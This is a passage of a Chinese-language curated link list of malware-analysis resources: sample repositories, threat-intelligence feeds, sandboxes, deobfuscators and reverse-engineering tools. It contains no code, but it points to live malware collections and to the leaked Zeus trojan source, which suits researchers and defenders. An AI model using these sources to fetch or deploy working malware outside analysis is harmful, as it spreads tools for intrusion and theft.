title="恶意软件样本库"></a>恶意软件样本库</h3><p><em>收集用于分析的恶意软件样本</em></p><ul><li><a href="http://support.clean-mx.de/clean-mx/viruses.php" target="_blank" rel="external">Clean MX</a> - 恶意软件和恶意域名的实时数据库</li><li><a href="http://contagiodump.blogspot.com/" target="_blank" rel="external">Contagio</a> - 近期的恶意软件样本和分析的收集</li><li><a href="https://www.exploit-db.com/" target="_blank" rel="external">Exploit Database</a> - Exploit 和 shellcode 样本</li><li><a href="http://malshare.com" target="_blank" rel="external">Malshare</a> - 在恶意网站上得到的大量恶意样本库</li><li><a href="http://malwaredb.malekal.com/" target="_blank" rel="external">MalwareDB</a> - 恶意软件样本库</li><li><a href="http://openmalware.org/" target="_blank" rel="external">Open Malware Project</a> - 样本信息和下载</li><li><a href="https://github.com/robbyFux/Ragpicker" target="_blank" rel="external">Ragpicker</a> - 基于 malware crawler 的一个插件</li><li><a href="https://github.com/ytisf/theZoo" target="_blank" rel="external">theZoo</a> - 分析人员的实时恶意样本库</li><li><a href="http://tracker.h3x.eu/" target="_blank" rel="external">Tracker h3x</a> - Agregator 的恶意软件跟踪和下载地址</li><li><a href="http://www.virusign.com/" target="_blank" rel="external">ViruSign</a> - 除 ClamAV 外的反病毒程序检出的恶意软件数据库</li><li><a href="http://virusshare.com/" target="_blank" rel="external">VirusShare</a> - 恶意软件库</li><li><a href="http://vxvault.net/" target="_blank" rel="external">VX Vault</a> - 恶意软件样本的主动收集</li><li><a href="https://zeltser.com/malware-sample-sources/" target="_blank" rel="external">Zeltser’s Sources</a> - 由 Lenny Zeltser 整理的恶意软件样本源列表</li><li><a href="https://github.com/Visgean/Zeus" target="_blank" rel="external">Zeus Source Code</a> - 2011 年 Zeus 源码泄露</li></ul><h2 id="开源威胁情报"><a href="#开源威胁情报" class="headerlink" title="开源威胁情报"></a>开源威胁情报</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><em>收集、分析 IOC 信息</em></p><ul><li><a href="https://github.com/abusesa/abusehelper" target="_blank" rel="external">AbuseHelper</a> - 用于接收和重新分发威胁情报的开源框架</li><li><a href="https://otx.alienvault.com/" target="_blank" rel="external">AlienVault Open Threat Exchange</a> - 威胁情报的共享与合作</li><li><a href="https://github.com/mlsecproject/combine" target="_blank" rel="external">Combine</a> - 从公开的信息源中得到威胁情报信息</li><li><a href="https://github.com/keithjjones/fileintel" target="_blank" rel="external">Fileintel</a> - 文件情报</li><li><a href="https://github.com/keithjjones/hostintel" target="_blank" rel="external">Hostintel</a> - 主机情报</li><li><a href="https://www.enisa.europa.eu/activities/cert/support/incident-handling-automation" target="_blank" rel="external">IntelMQ</a> - CERT 使用消息队列来处理应急数据的工具</li><li><a href="https://www.mandiant.com/resources/download/ioc-editor/" target="_blank" rel="external">IOC Editor</a> - Mandiant 出品的一个免费的 XML IOC 文件编辑器</li><li><a href="https://github.com/mandiant/ioc_writer" target="_blank" rel="external">ioc_writer</a> - 开发的用于 OpenIOC 对象的 Python 库</li><li><a href="https://github.com/csirtgadgets/massive-octo-spice" target="_blank" rel="external">Massive Octo Spice</a> - 由 <a href="http://csirtgadgets.org/collective-intelligence-framework" target="_blank" rel="external">CSIRT Gadgets Foundation</a>发起，之前叫做 CIF (Collective Intelligence Framework)，从各种信息源聚合 IOC 信息</li><li><a href="https://github.com/MISP/MISP" target="_blank" rel="external">MISP</a> - 由 <a href="http://www.misp-project.org/" target="_blank" rel="external">The MISP Project</a> 发起的恶意软件信息共享平台</li><li><a href="https://www.passivetotal.org/" target="_blank" rel="external">PassiveTotal</a> - 研究、链接、标注和分享 IP 与 域名</li><li><a href="https://github.com/pidydx/PyIOCe" target="_blank" rel="external">PyIOCe</a> - 一个 Python OpenIOC 编辑器</li><li><a href="https://github.com/jpsenior/threataggregator" target="_blank" rel="external">threataggregator</a> - 聚合来自多个信息源的安全威胁，包括 <a href="#other-resources">other resources</a> 列表中的一些</li><li><a href="https://www.threatcrowd.org/" target="_blank" rel="external">ThreatCrowd</a> - 带有图形可视化的威胁搜索引擎</li><li><a href="https://github.com/mlsecproject/tiq-test" target="_blank" rel="external">TIQ-test</a> - 威胁情报源的数据可视化和统计分析</li></ul><h3 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h3><p><em>威胁情报和 IOC 资源</em></p><ul><li><a href="http://autoshun.org/" target="_blank" rel="external">Autoshun</a> (<a href="http://autoshun.org/" target="_blank" rel="external">list</a>) - Snort 插件和黑名单</li><li><a href="http://osint.bambenekconsulting.com/feeds/" target="_blank" rel="external">Bambenek Consulting Feeds</a> - 基于恶意 DGA 算法的 OSINT 订阅</li><li><a href="https://www.fidelissecurity.com/resources/fidelis-barncat" target="_blank" rel="external">Fidelis Barncat</a> - 可扩展的恶意软件配置数据库（必须有请求权限）</li><li><a href="http://www.ciarmy.com/" target="_blank" rel="external">CI Army</a> (<a href="http://www.ciarmy.com/list/ci-badguys.txt" target="_blank" rel="external">list</a>) - 网络安全黑名单</li><li><a href="https://intel.CriticalStack.com" target="_blank" rel="external">Critical Stack- Free Intel Market</a> - 免费的英特尔去重聚合项目，有超过 90 种订阅以及超过一百二十万个威胁情报信息</li><li><a href="http://threatcenter.crdf.fr/" target="_blank" rel="external">CRDF ThreatCenter</a> - 由 CRDF 提供的新威胁检出</li><li><a href="http://cybercrime-tracker.net/" target="_blank" rel="external">Cybercrime tracker</a> - 多个僵尸网络的活动跟踪</li><li><a href="https://github.com/fireeye/iocs" target="_blank" rel="external">FireEye IOCs</a> - 由 FireEye 共享的 IOC 信息</li><li><a href="https://iplists.firehol.org/" target="_blank" rel="external">FireHOL IP Lists</a> - 针对攻击、恶意软件的更改历史、国家地图和保留政策的 350+ IP 的跟踪</li><li><a href="https://github.com/rep/hpfeeds" target="_blank" rel="external">hpfeeds</a> - 蜜罐订阅协议</li><li><a href="https://isc.sans.edu/" target="_blank" rel="external">Internet Storm Center (DShield)</a> - 日志和可搜索的事件数据库，并且带有 Web <a href="https://dshield.org/api/" target="_blank" rel="external">API</a>(<a href="https://github.com/rshipp/python-dshield" target="_blank" rel="external">非官方 Python 库</a>).</li><li><a href="http://malc0de.com/database/" target="_blank" rel="external">malc0de</a> - 搜索事件数据库</li><li><a href="http://www.malwaredomainlist.com/" target="_blank" rel="external">Malware Domain List</a> - 搜索和分享恶意软件 URL</li><li><a href="http://openioc.org/" target="_blank" rel="external">OpenIOC</a> - 威胁情报共享框架</li><li><a href="https://palevotracker.abuse.ch/blocklists.php" target="_blank" rel="external">Palevo Blocklists</a> - 蜜罐 C&amp;C 黑名单</li><li><a href="https://www.proofpoint.com/us/products/et-intelligence" target="_blank" rel="external">Proofpoint Threat Intelligence</a> - 以前新兴威胁的规则集</li><li><a href="https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/pubhtml" target="_blank" rel="external">Ransomware overview</a> - 勒索软件的概述列表</li><li><a href="http://stix.mitre.org/" target="_blank" rel="external">STIX - Structured Threat Information eXpression</a> - 通过标准化的语言来表示、共享网络威胁信息<br><a href="http://mitre.org" target="_blank" rel="external">MITRE</a> 相关:<ul><li><a href="http://capec.mitre.org/" target="_blank" rel="external">CAPEC - 常见攻击模式枚举与分类</a></li><li><a href="http://cybox.mitre.org/" target="_blank" rel="external">CybOX - 网络观测 eXpression</a></li><li><a href="http://maec.mitre.org/" target="_blank" rel="external">MAEC - 恶意软件特征枚举与界定</a></li><li><a href="http://taxii.mitre.org/" target="_blank" rel="external">TAXII - 可信的指标信息自动化交换</a></li></ul></li><li><a href="https://threatrecon.co/" target="_blank" rel="external">threatRECON</a> - 搜索指标，每月最多一千次</li><li><a href="https://github.com/Yara-Rules/rules" target="_blank" rel="external">Yara rules</a> - Yara 规则集</li><li><a href="https://zeustracker.abuse.ch/blocklist.php" target="_blank" rel="external">ZeuS Tracker</a> - ZeuS 黑名单</li></ul><h2 id="检测与分类"><a href="#检测与分类" class="headerlink" title="检测与分类"></a>检测与分类</h2><p><em>反病毒和其他恶意软件识别工具</em></p><ul><li><a href="https://github.com/hiddenillusion/AnalyzePE" target="_blank" rel="external">AnalyzePE</a> - Windows PE 文件的分析器</li><li><a href="http://www.chkrootkit.org/" target="_blank" rel="external">chkrootkit</a> - 本地 Linux rootkit 检测</li><li><a href="http://www.clamav.net/" target="_blank" rel="external">ClamAV</a> - 开源反病毒引擎</li><li><a href="https://github.com/horsicq/Detect-It-Easy" target="_blank" rel="external">Detect-It-Easy</a> - 用于确定文件类型的程序</li><li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">ExifTool</a> - 读、写、编辑文件的元数据</li><li><a href="http://www.sno.phy.queensu.ca/%7Ephil/exiftool/" target="_blank" rel="external">File Scanning Framework</a> - 模块化的递归文件扫描解决方案</li><li><a href="https://github.com/jessek/hashdeep" target="_blank" rel="external">hashdeep</a> - 用各种算法计算哈希值</li><li><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="external">Loki</a> - 基于主机的 IOC 扫描器</li><li><a href="https://github.com/Dynetics/Malfunction" target="_blank" rel="external">Malfunction</a> - 在功能层面对恶意软件进行分类和比较</li><li><a href="https://github.com/KoreLogicSecurity/mastiff" target="_blank" rel="external">MASTIFF</a> - 静态分析框架</li><li><a href="https://github.com/MITRECND/multiscanner" target="_blank" rel="external">MultiScanner</a> - 模块化文件扫描/分析框架</li><li><a href="https://github.com/rjhansen/nsrllookup" target="_blank" rel="external">nsrllookup</a> - 查询 NIST’s National Software Reference Library 数据库中哈希的工具</li><li><a href="http://handlers.sans.org/jclausing/packerid.py" target="_blank" rel="external">packerid</a> - 跨平台的 PEiD 的替代品</li><li><a href="http://pev.sourceforge.net/" target="_blank" rel="external">PEV</a> - 为正确分析可疑的二进制文件提供功能丰富工具的 PE 文件多平台分析工具集</li><li><a href="http://rkhunter.sourceforge.net/" target="_blank" rel="external">Rootkit Hunter</a> - 检测 Linux 的 rootkits</li><li><a href="http://ssdeep.sourceforge.net/" target="_blank" rel="external">ssdeep</a> - 计算模糊哈希值</li><li><a href="https://gist.github.com/malc0de/10270150" target="_blank" rel="external">totalhash.py</a> - 一个简单搜索<a href="http://totalhash.com/" target="_blank" rel="external">TotalHash.com</a> 数据库的 Python 脚本</li><li><a href="http://mark0.net/soft-trid-e.html" target="_blank" rel="external">TrID</a> - 文件识别</li><li><a href="https://plusvic.github.io/yara/" target="_blank" rel="external">YARA</a> - 分析师利用的模式识别工具</li><li><a href="https://github.com/Neo23x0/yarGen" target="_blank" rel="external">Yara rules generator</a> - 基于恶意样本生成 yara 规则，也包含避免误报的字符串数据库</li></ul><h2 id="在线扫描与沙盒"><a href="#在线扫描与沙盒" class="headerlink" title="在线扫描与沙盒"></a>在线扫描与沙盒</h2><p><em>基于 Web 的多反病毒引擎扫描器和恶意软件自动分析的沙盒</em></p><ul><li><a href="https://www.apk-analyzer.net/" target="_blank" rel="external">APK Analyzer</a> - APK 免费动态分析</li><li><a href="https://andrototal.org/" target="_blank" rel="external">AndroTotal</a> - 利用多个移动反病毒软件进行免费在线分析 App</li><li><a href="https://avcaesar.malware.lu/" target="_blank" rel="external">AVCaesar</a> - Malware.lu 在线扫描器和恶意软件集合</li><li><a href="http://www.cryptam.com/" target="_blank" rel="external">Cryptam</a> - 分析可疑的 Office 文档</li><li><a href="http://cuckoosandbox.org/" target="_blank" rel="external">Cuckoo Sandbox</a> - 开源、自主的沙盒和自动分析系统</li><li><a href="https://github.com/brad-accuvant/cuckoo-modified" target="_blank" rel="external">cuckoo-modified</a> - GPL 许可证的 Cuckoo 沙盒的修改版，由于法律原因作者没有将其分支合并</li><li><a href="https://github.com/brad-accuvant/cuckoo-modified" target="_blank" rel="external">cuckoo-modified-api</a> - 用于控制 cuckoo-modified 沙盒的 Python API</li><li><a href="https://www.deepviz.com/" target="_blank" rel="external">DeepViz</a> - 通过机器学习分类来分析的多格式文件分析器</li><li><a href="https://github.com/detuxsandbox/detux/" target="_blank" rel="external">detux</a> - 一个用于对 Linux 恶意软件流量分析与 IOC 信息捕获的沙盒</li><li><a href="https://www.document-analyzer.net/" target="_blank" rel="external">Document Analyzer</a> - DOC 和 PDF 文件的免费动态分析</li><li><a href="https://github.com/tklengyel/drakvuf" target="_blank" rel="external">DRAKVUF</a> - 动态恶意软件分析系统</li><li><a href="https://www.file-analyzer.net/" target="_blank" rel="external">File Analyzer</a> - 免费 PE 文件动态分析</li><li><a href="http://firmware.re/" target="_blank" rel="external">firmware.re</a> - 解包、扫描、分析绝大多数固件包</li><li><a href="https://www.hybrid-analysis.com/" target="_blank" rel="external">Hybrid Analysis</a> - 由 VxSandbox 支持的在线恶意软件分析工具</li><li><a href="http://irma.quarkslab.com/" target="_blank" rel="external">IRMA</a> - 异步、可定制的可疑文件分析平台</li><li><a href="https://www.joesecurity.org/" target="_blank" rel="external">Joe Sandbox</a> - 深度恶意软件分析</li><li><a href="https://virusscan.jotti.org/en" target="_blank" rel="external">Jotti</a> - 免费在线多反病毒引擎扫描器</li><li><a href="https://github.com/monnappa22/Limon" target="_blank" rel="external">Limon</a> - 分析 Linux 恶意软件的沙盒</li><li><a href="https://github.com/rieck/malheur" target="_blank" rel="external">Malheur</a> - 恶意行为的自动化沙盒分析</li><li><a href="https://malwareconfig.com/" target="_blank" rel="external">Malware config</a> - 从常见的恶意软件提取、解码和在线配置</li><li><a href="https://malwr.com/" target="_blank" rel="external">Malwr</a> - 免费的在线 Cuckoo 沙盒分析实例</li><li><a href="https://mastiff-online.korelogic.com/" target="_blank" rel="external">MASTIFF Online</a> - 在线恶意软件静态分析</li><li><a href="https://www.metadefender.com/" target="_blank" rel="external">Metadefender.com</a> - 扫描文件、哈希或恶意软件的 IP 地址</li><li><a href="https://www.networktotal.com/index.html" target="_blank" rel="external">NetworkTotal</a> - 一个分析 pcap 文件的服务，使用配置了 EmergingThreats Pro 的Suricata 快速检测病毒、蠕虫、木马和各种恶意软件</li><li><a href="https://github.com/Rurik/Noriben" target="_blank" rel="external">Noriben</a> - 使用 Sysinternals Procmon 收集恶意软件在沙盒环境下的进程信息</li><li><a href="http://www.pdfexaminer.com/" target="_blank" rel="external">PDF Examiner</a> - 收集可疑的 PDF 文件</li><li><a href="http://www.procdot.com/" target="_blank" rel="external">ProcDot</a> - 一个可视化恶意软件分析工具集</li><li><a href="https://github.com/secretsquirrel/recomposer" target="_blank" rel="external">Recomposer</a> - 安全上传二进制程序到沙盒网站的辅助脚本</li><li><a href="http://sanddroid.xjtu.edu.cn/" target="_blank" rel="external">Sand droid</a> - 自动化、完整的 Android 应用程序分析系统</li><li><a href="https://github.com/F-Secure/see" target="_blank" rel="external">SEE</a> - 在安全环境中构建测试自动化的框架</li><li><a href="https://www.url-analyzer.net/" target="_blank" rel="external">URL Analyzer</a> - 对 URL 文件的动态分析</li><li><a href="https://www.virustotal.com/" target="_blank" rel="external">VirusTotal</a> - 免费的在线恶意软件样本和 URL 分析</li><li><a href="https://github.com/keithjjones/visualize_logs" target="_blank" rel="external">Visualize_Logs</a> - 用于日志的开源可视化库和命令行工具（Cuckoo、Procmon 等）</li><li><a href="https://zeltser.com/automated-malware-analysis/" target="_blank" rel="external">Zeltser’s List</a> - Lenny Zeltser 创建的免费自动沙盒服务</li></ul><h2 id="域名分析"><a href="#域名分析" class="headerlink" title="域名分析"></a>域名分析</h2><p><em>检查域名和 IP 地址</em></p><ul><li><a href="http://desenmascara.me" target="_blank" rel="external">Desenmascara.me</a> - 一键点击即可得到尽可能多的检索元数据以评估一个网站的信誉度</li><li><a href="http://networking.ringofsaturn.com/" target="_blank" rel="external">Dig</a> - 免费的在线 dig 以及其他网络工具</li><li><a href="https://github.com/elceef/dnstwist" target="_blank" rel="external">dnstwist</a> - 用于检测钓鱼网站和公司间谍活动的域名排名网站</li><li><a href="https://github.com/hiddenillusion/IPinfo" target="_blank" rel="external">IPinfo</a> - 通过搜索在线资源收集关于 IP 或 域名的信息</li><li><a href="https://github.com/hurricanelabs/machinae" target="_blank" rel="external">Machinae</a> - 类似 Automator 的 OSINT 工具，用于收集有关 URL、IP 或哈希的信息</li><li><a href="https://github.com/FGRibreau/mailchecker" target="_blank" rel="external">mailchecker</a> - 跨语言临时邮件检测库</li><li><a href="https://github.com/michael-yip/MaltegoVT" target="_blank" rel="external">MaltegoVT</a> - 让 Maltego 使用 VirusTotal API，允许搜索域名、IP 地址、文件哈希、报告</li><li><a href="http://multirbl.valli.org/" target="_blank" rel="external">Multi rbl</a> - 多个 DNS 黑名单，反向查找超过 300 个 RBL。</li><li><a href="http://www.senderbase.org/" target="_blank" rel="external">SenderBase</a> - 搜索 IP、域名或网络的所有者</li><li><a href="https://www.spamcop.net/bl.shtml" target="_blank" rel="external">SpamCop</a> - 垃圾邮件 IP 黑名单IP</li><li><a href="http://www.spamhaus.org/lookup/" target="_blank" rel="external">SpamHaus</a> - 基于域名和 IP 的黑名单</li><li><a href="https://sitecheck.sucuri.net/" target="_blank" rel="external">Sucuri SiteCheck</a> - 免费的网站恶意软件与安全扫描器</li><li><a href="http://www.tekdefense.com/automater/" target="_blank" rel="external">TekDefense Automator</a> - 收集关于 URL、IP 和哈希值的 OSINT 工具</li><li><a href="http://urlquery.net/" target="_blank" rel="external">URLQuery</a> - 免费的 URL 扫描器</li><li><a href="http://whois.domaintools.com/" target="_blank" rel="external">Whois</a> - DomainTools 家免费的 whois 搜索</li><li><a href="https://zeltser.com/lookup-malicious-websites/" target="_blank" rel="external">Zeltser’s List</a> - 由 Lenny Zeltser 整理的免费在线恶意软件工具集</li><li><a href="http://zulu.zscaler.com/#" target="_blank" rel="external">ZScalar Zulu</a> - Zulu URL 风险分析</li></ul><h2 id="浏览器恶意软件"><a href="#浏览器恶意软件" class="headerlink" title="浏览器恶意软件"></a>浏览器恶意软件</h2><p><em>分析恶意 URL，也可以参考 <a href="#domain-analysis">domain analysis</a> 和 <a href="#documents-and-shellcode">documents and shellcode</a> 部分</em></p><ul><li><a href="http://getfirebug.com/" target="_blank" rel="external">Firebug</a> - Firefox Web 开发扩展</li><li><a href="http://jd.benow.ca/" target="_blank" rel="external">Java Decompiler</a> - 反编译并检查 Java 的应用</li><li><a href="https://github.com/Rurik/Java_IDX_Parser/" target="_blank" rel="external">Java IDX Parser</a> - 解析 Java IDX 缓存文件</li><li><a href="http://www.relentless-coding.com/projects/jsdetox/" target="_blank" rel="external">JSDetox</a> - JavaScript 恶意软件分析工具</li><li><a href="https://github.com/urule99/jsunpack-n" target="_blank" rel="external">jsunpack-n</a> - 一个 javascript 解压软件，可以模拟浏览器功能</li><li><a href="https://github.com/Storyyeller/Krakatau" target="_blank" rel="external">Krakatau</a> - Java 的反编译器、汇编器与反汇编器</li><li><a href="http://malzilla.sourceforge.net/" target="_blank" rel="external">Malzilla</a> - 分析恶意 Web 页面</li><li><a href="https://github.com/CyberShadow/RABCDAsm" target="_blank" rel="external">RABCDAsm</a> - 一个健壮的 ActionScript 字节码反汇编</li><li><a href="http://www.swftools.org/" target="_blank" rel="external">swftools</a> - PDF 转换成 SWF 的工具</li><li><a href="http://hooked-on-mnemonics.blogspot.com/2011/12/xxxswfpy.html" target="_blank" rel="external">xxxswf</a> - 分析 Flash 文件的 Python 脚本</li></ul><h2 id="文档和-Shellcode"><a href="#文档和-Shellcode" class="headerlink" title="文档和 Shellcode"></a>文档和 Shellcode</h2><p><em>在 PDF、Office 文档中分析恶意 JS 和 Shellcode，也可参考<a href="#browser-malware">browser malware</a> 部分</em></p><ul><li><a href="https://github.com/hiddenillusion/AnalyzePDF" target="_blank" rel="external">AnalyzePDF</a> - 分析 PDF 并尝试判断其是否是恶意文件的工具</li><li><a href="https://github.com/CapacitorSet/box-js" target="_blank" rel="external">box-js</a> - 用于研究 JavaScript 恶意软件的工具，支持 JScript/WScript 和 ActiveX 仿真功能</li><li><a href="http://www.ragestorm.net/distorm/" target="_blank" rel="external">diStorm</a> - 分析恶意 Shellcode 的反汇编器</li><li><a href="http://jsbeautifier.org/" target="_blank" rel="external">JS Beautifier</a> - JavaScript 脱壳和去混淆</li><li><a href="http://www.kahusecurity.com/2015/new-javascript-deobfuscator-tool/" target="_blank" rel="external">JS Deobfuscator </a>- 对那些使用 eval 或 document.write 的简单 Javascript 去混淆</li><li><a href="http://libemu.carnivore.it/" target="_blank" rel="external">libemu</a> - x86 shellcode 仿真的库和工具</li><li><a href="https://github.com/9b/malpdfobj" target="_blank" rel="external">malpdfobj</a> - 解构恶意 PDF 为 JSON 表示</li><li><a href="http://www.reconstructer.org/code.html" target="_blank" rel="external">OfficeMalScanner</a> - 扫描 MS Office 文档中的恶意跟踪</li><li><a href="http://www.decalage.info/python/olevba" target="_blank" rel="external">olevba</a> - 解析 OLE 和 OpenXML 文档，并提取有用信息的脚本</li><li><a href="https://code.google.com/p/origami-pdf/" target="_blank" rel="external">Origami PDF</a> - 一个分析恶意 PDF 的工具</li><li><a href="http://blog.didierstevens.com/programs/pdf-tools/" target="_blank" rel="external">PDF Tools</a> - Didier Stevens 开发的许多关于 PDF 的工具</li><li><a href="https://github.com/9b/pdfxray_lite" target="_blank" rel="external">PDF X-Ray Lite</a> - PDF 分析工具，PDF X-RAY 的无后端版本</li><li><a href="http://eternal-todo.com/tools/peepdf-pdf-analysis-tool" target="_blank" rel="external">peepdf</a> - 用来探索可能是恶意的 PDF 的 Python 工具</li><li><a href="https://www.quicksand.io/" target="_blank" rel="external">QuickSand</a> - QuickSand 是一个紧凑的 C 框架，用于分析可疑的恶意软件文档，以识别不同编码流中的漏洞，并定位和提取嵌入的可执行文件</li><li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="external">Spidermonkey</a> - Mozilla 的 JavaScript 引擎，用来调试可疑 JS 代码</li></ul><h2 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h2><p><em>从硬盘和内存镜像中提取文件</em></p><ul><li><a href="https://github.com/simsong/bulk_extractor" target="_blank" rel="external">bulk_extractor</a> - 快速文件提取工具</li><li><a href="https://github.com/williballenthin/EVTXtract" target="_blank" rel="external">EVTXtract</a> - 从原始二进制数据提取 Windows 事件日志文件</li><li><a href="http://foremost.sourceforge.net/" target="_blank" rel="external">Foremost</a> - 由 US Air Force 设计的文件提取工具</li><li><a href="https://bitbucket.org/haypo/hachoir" target="_blank" rel="external">Hachoir</a> - 处理二进制程序的 Python 库的集合</li><li><a href="https://github.com/sleuthkit/scalpel" target="_blank" rel="external">Scalpel</a> - 另一个数据提取工具</li></ul><h2 id="去混淆"><a href="#去混淆" class="headerlink" title="去混淆"></a>去混淆</h2><p><em>破解异或或其它代码混淆方法</em></p><ul><li><a href="https://bitbucket.org/decalage/balbuzard/wiki/Home" target="_blank" rel="external">Balbuzard</a> - 去除混淆(XOR、ROL等)的恶意软件分析工具</li><li><a href="https://github.com/0xd4d/de4dot" target="_blank" rel="external">de4dot</a> - .NET 去混淆与脱壳</li><li><a href="http://hooked-on-mnemonics.blogspot.com/2014/04/expexorpy.html" target="_blank" rel="external">ex_pe_xor</a> 和 <a href="http://hooked-on-mnemonics.blogspot.com/p/iheartxor.html" target="_blank" rel="external">iheartxor</a> - Alexander Hanel 开发的用于去除单字节异或编码的文件的两个工具</li><li><a href="https://github.com/fireeye/flare-floss" target="_blank" rel="external">FLOSS</a> - FireEye 实验室的混淆字符串求解工具，使用高级静态分析技术来自动去除恶意软件二进制文件中的字符串</li><li><a href="https://github.com/hiddenillusion/NoMoreXOR" target="_blank" rel="external">NoMoreXOR</a> - 通过频率分析来猜测一个 256 字节的异或密钥</li><li><a href="https://github.com/BromiumLabs/PackerAttacker" target="_blank" rel="external">PackerAttacker</a> - Windows 恶意软件的通用隐藏代码提取程序</li><li><a href="https://github.com/malwaremusings/unpacker/" target="_blank" rel="external">unpacker</a> - 基于 WinAppDbg 的自动 Windows 恶意软件脱壳器</li><li><a href="https://github.com/tomchop/unxor/" target="_blank" rel="external">unxor</a> - 通过已知明文攻击来猜测一个异或密钥</li><li><a href="https://github.com/jnraber/VirtualDeobfuscator" target="_blank" rel="external">VirtualDeobfuscator</a> - 虚拟逆向分析工具</li><li><a href="http://eternal-todo.com/var/scripts/xorbruteforcer" target="_blank" rel="external">XORBruteForcer</a> - 爆破单字节异或密钥的 Python 脚本</li><li><a href="http://blog.didierstevens.com/programs/xorsearch/" target="_blank" rel="external">XORSearch 和 XORStrings</a> - Didier Stevens 开发的用于寻找异或混淆后数据的两个工具</li><li><a href="https://github.com/hellman/xortool" target="_blank" rel="external">xortool</a> - 猜测异或密钥和密钥的长度</li></ul><h2 id="调试和逆向工程"><a href="#调试和逆向工程" class="headerlink" title="调试和逆向工程"></a>调试和逆向工程</h2><p><em>反编译器、调试器和其他静态、动态分析工具</em></p><ul><li><a href="https://github.com/angr/angr" target="_blank" rel="external">angr</a> - UCSB 的安全实验室开发的跨平台二进制分析框架</li><li><a href="https://github.com/bwall/bamfdetect" target="_blank" rel="external">bamfdetect</a> - 识别和提取奇迹人和其他恶意软件的信息</li><li><a href="https://github.com/BinaryAnalysisPlatform/bap" target="_blank" rel="external">BAP</a> - CMU 的安全实验室开发的跨平台开源二进制分析框架</li><li><a href="https://github.com/programa-stic/barf-project" target="_blank" rel="external">BARF</a> - 跨平台、开源二进制分析逆向框架</li><li><a href="https://github.com/google/binnavi" target="_blank" rel="external">binnavi</a> - 基于图形可视化的二进制分析 IDE</li><li><a href="http://binwalk.org/" target="_blank" rel="external">Binwalk</a> - 固件分析工具</li><li><a href="https://inguma.eu/projects/bokken" target="_blank" rel="external">Bokken</a> - Pyew 和 Radare 的界面版</li><li><a href="https://github.com/aquynh/capstone" target="_blank" rel="external">Capstone</a> - 二进制分析反汇编框架，支持多种架构和许多语言</li><li><a href="https://github.com/hugsy/codebro" target="_blank" rel="external">codebro</a> - 使用 clang 提供基础代码分析的 Web 端代码浏览器</li><li><a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="external">dnSpy</a> - .NET 编辑器、编译器、调试器</li><li><a href="http://codef00.com/projects#debugger" target="_blank" rel="external">Evan’s Debugger (EDB)</a> - Qt GUI 程序的模块化调试器</li><li><a href="https://github.com/rabbitstack/fibratus" target="_blank" rel="external">Fibratus</a> - 探索、跟踪 Windows 内核的工具</li><li><a href="http://www.mcafee.com/us/downloads/free-tools/fport.aspx#" target="_blank" rel="external">FPort</a> - 实时查看系统中打开的 TCP/IP 和 UDP 端口，并映射到应用程序</li><li><a href="http://www.sourceware.org/gdb/" target="_blank" rel="external">GDB</a> - GNU 调试器</li><li><a href="https://github.com/hugsy/gef" target="_blank" rel="external">GEF</a> - 针对开发人员和逆向工程师的 GDB 增强版</li><li><a href="https://github.com/codypierce/hackers-grep" target="_blank" rel="external">hackers-grep</a> - 用来搜索 PE 程序中的导入表、导出表、字符串、调试符号</li><li><a href="https://www.hex-rays.com/products/ida/index.shtml" target="_blank" rel="external">IDA Pro</a> - Windows 反汇编和调试器，有免费评估版</li><li><a href="http://debugger.immunityinc.com/" target="_blank" rel="external">Immunity Debugger</a> - 带有 Python API 的恶意软件调试器</li><li><a href="http://ltrace.org/" target="_blank" rel="external">ltrace</a> - Linux 可执行文件的动态分析</li><li><a href="https://en.wikipedia.org/wiki/Objdump" target="_blank" rel="external">objdump</a> - GNU 工具集的一部分，面向 Linux 二进制程序的静态分析</li><li><a href="http://www.ollydbg.de/" target="_blank" rel="external">OllyDbg</a> - Windows 可执行程序汇编级调试器</li><li><a href="https://github.com/moyix/panda" target="_blank" rel="external">PANDA</a> - 动态分析平台</li><li><a href="https://github.com/longld/peda" target="_blank" rel="external">PEDA</a> - 基于 GDB 的 Pythton Exploit 开发辅助工具，增强显示及增强的命令</li><li><a href="https://winitor.com/" target="_blank" rel="external">pestudio</a> - Windows 可执行程序的静态分析</li><li><a href="https://github.com/joelpx/plasma" target="_blank" rel="external">plasma</a> - 面向 x86/ARM/MIPS 的交互式反汇编器</li><li><a href="https://www.mzrst.com/" target="_blank" rel="external">PPEE (puppy)</a> - 专业的 PE 文件资源管理器</li><li><a href="https://technet.microsoft.com/en-us/sysinternals/processexplorer.aspx" target="_blank" rel="external">Process Explorer </a>- 高级 Windows 任务管理器</li><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb896645.aspx" target="_blank" rel="external">Process Monitor</a> - Windows 下高级程序监控工具</li><li><a href="https://technet.microsoft.com/en-us/sysinternals/pstools.aspx" target="_blank" rel="external">PSTools</a> - 可以帮助管理员实时管理系统的 Windows 命令行工具</li><li><a href="https://github.com/joxeankoret/pyew" target="_blank" rel="external">Pyew</a> - 恶意软件分析的 Python 工具</li><li><a href="http://www.radare.org/r/" target="_blank" rel="external">Radare2</a> - 带有调试器支持的逆向工程框架</li><li><a href="https://retdec.com/" target="_blank" rel="external">RetDec</a> - 可重定向的机器码反编译器，同时有在线反编译服务和 API</li><li><a href="https://github.com/vrtadmin/ROPMEMU" target="_blank" rel="external">ROPMEMU</a> - 分析、解析、反编译复杂的代码重用攻击的框架</li><li><a href="https://github.com/pidydx/SMRT" target="_blank" rel="external">SMRT</a> - Sublime 3 中辅助恶意软件分析的插件</li><li><a href="http://sourceforge.net/projects/strace/" target="_blank" rel="external">strace</a> - Linux 可执行文件的动态分析</li><li><a href="http://triton.quarkslab.com/" target="_blank" rel="external">Triton</a> - 一个动态二进制分析框架</li><li><a href="https://github.com/vmt/udis86" target="_blank" rel="external">Udis86</a> - x86 和 x86_64 的反汇编库和工具</li><li><a href="https://github.com/vivisect/vivisect" target="_blank" rel="external">Vivisect</a> - 恶意软件分析的 Python 工具</li><li><a href="https://github.com/x64dbg/" target="_blank" rel="external">X64dbg</a> - Windows 